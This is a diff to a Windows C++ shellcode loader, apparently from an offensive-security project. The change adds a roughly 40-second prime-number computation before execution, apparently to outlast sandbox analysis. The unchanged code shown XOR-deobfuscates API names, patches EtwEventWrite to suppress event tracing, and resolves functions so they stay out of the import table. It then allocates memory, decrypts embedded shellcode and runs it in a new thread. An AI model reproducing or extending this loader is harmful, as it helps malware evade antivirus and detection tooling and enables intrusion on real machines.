@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <cstdio>
+#include <vector>
 
 
 // This function XORs the data array with the key array
@@ -67,6 +68,34 @@ void patchEtw(char* ntdll_dll_obfuscated_function_name, char* EtwEventWrite_obfu
 #endif
 }
 
+int get_largest_prime_number(int end_number)
+{
+    std::vector<int> test_sequence {2};
+
+    for (int start_number = 3; start_number <= end_number; start_number++)
+    {
+        bool is_prime = true;
+        for (int n : test_sequence)
+            if (start_number % n == 0 && start_number != n)
+                is_prime = false;
+
+        if (is_prime)
+            test_sequence.push_back(start_number);
+    }
+
+    int largest_prime_number = test_sequence.back();
+
+    test_sequence.clear();
+
+#if DEBUG
+    printf("Prime number computed : %d\n", largest_prime_number);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
+
+    return largest_prime_number;
+}
+
 int main()
 {
 
@@ -78,7 +107,12 @@ int main()
 #include "../../src/shellcodes/xored_calc.hpp"
 #endif
 
-	// Step 1 : deobfuscate all the names
+    // Step 1 : Calculate the largest prime number (before a specific number)
+    // About 40 seconds on 11th Gen i5 4 Cores
+    int end_number = 400000;
+    int largest_prime_number = get_largest_prime_number(end_number);
+
+	// Step 2 : deobfuscate all the names
 	my_xor(KERNEL32_dll_obfuscated_function_name, sizeof(KERNEL32_dll_obfuscated_function_name), KERNEL32_dll_key, sizeof(KERNEL32_dll_key));
 	my_xor(CreateThread_obfuscated_function_name, sizeof(CreateThread_obfuscated_function_name), CreateThread_key, sizeof(CreateThread_key));
 	my_xor(VirtualAlloc_obfuscated_function_name, sizeof(VirtualAlloc_obfuscated_function_name), VirtualAlloc_key, sizeof(VirtualAlloc_key));
@@ -104,10 +138,10 @@ int main()
 	getchar();
 #endif
 
-	// Step 2 : patch the EtwEventWrite function
+	// Step 3 : patch the EtwEventWrite function
 	patchEtw((char*) ntdll_dll_obfuscated_function_name, (char*) EtwEventWrite_obfuscated_function_name);
 
-	// Step 3 : get pointers to the functions to use without leaving traces in the import table
+	// Step 4 : get pointers to the functions to use without leaving traces in the import table
 	// get the handle to the kernel32.dll module
 	HMODULE kernel32_dll = GetModuleHandleA((char*)KERNEL32_dll_obfuscated_function_name);
 
@@ -162,7 +196,7 @@ int main()
 	getchar();
 #endif
 
-	// Step 1 : Allocate the memory
+	// Step 5 : Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
 								sizeof(shellcode),
 								MEM_COMMIT,
@@ -179,7 +213,7 @@ int main()
 	getchar();
 #endif
 
-	// Step 2 : Copy the encrypted shellcode to the allocated memory
+	// Step 6 : Copy the encrypted shellcode to the allocated memory
 	memcpy(memory,
 		   shellcode,
 		   sizeof(shellcode));
@@ -190,7 +224,7 @@ int main()
 	getchar();
 #endif
 
-	// Step 3 : Decrypt the payload
+	// Step 7 : Decrypt the payload
 	my_xor((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
 
 #if DEBUG
@@ -199,7 +233,7 @@ int main()
 	getchar();
 #endif
 
-	// Step 4 : Create a thread pointing to the shellcode address
+	// Step 8 : Create a thread pointing to the shellcode address
 	HANDLE thread =	CreateThread(nullptr,
 				 0,
 				 (LPTHREAD_START_ROUTINE) memory,
